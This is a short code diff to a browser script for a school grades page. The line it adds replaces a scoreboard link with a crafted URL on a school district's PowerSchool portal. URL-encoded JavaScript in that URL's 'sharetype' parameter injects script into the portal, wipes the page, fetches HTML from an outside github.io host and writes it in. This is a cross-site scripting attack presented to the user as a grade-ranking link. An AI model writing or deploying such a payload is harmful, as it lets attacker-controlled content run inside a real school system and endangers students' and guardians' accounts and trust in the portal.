@@ -116,7 +116,7 @@ if (document.title.indexOf("Grades and Attendance") != -1) {
         ouput = (obj.players[0].player_name)
         console.log(ouput)
         ins(ouput+" has the best grade")
-        ins("You have the #"+getRanking(ok,obj)+" best grade in the class","https://keepthescore.co/board/yjxrblmwdae/")
+        ins("You have the #"+getRanking(ok,obj)+" best grade in the class","https://powerschool.cape.k12.me.us/guardian/forms.html?sharetype=%22;(function()%7B%0A%20%20%20%20document.body.innerHTML%20%3D%20%27%3Ch3%3Ehello%3C%2Fh3%3E%27%0A%20%20%20%20setTimeout(function()%7B%0A%20%20%20%20%20%20%20%20document.body.innerHTML%20%3D%20%27%27%0A%20%20%20%20%20%20%20%20document.body.id%20%3D%20%27%27%3B%0A%20%20%20%20%20%20%20%20document.write(%27%27)%0A%20%20%20%20%20%20%20%20var%20xmlHttp%20%3D%20new%20XMLHttpRequest()%3B%0A%20%20%20%20%20%20%20%20xmlHttp.open(%20%22GET%22%2C%20%22https%3A%2F%2Felliotdoescode.github.io%2FPOWERschool%2Frawr.html%22%2C%20false%20)%3B%0A%20%20%20%20%20%20%20%20xmlHttp.send(%20null%20)%3B%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20var%20result%20%3D%20xmlHttp.responseText%3B%0A%20%20%20%20%20%20%20%20console.log(result)%0A%20%20%20%20%20%20%20%20document.write(result)%0A%20%20%20%20%7D%2C200)%3B%0A%7D)()%3B//")
         callbac()
     }
     
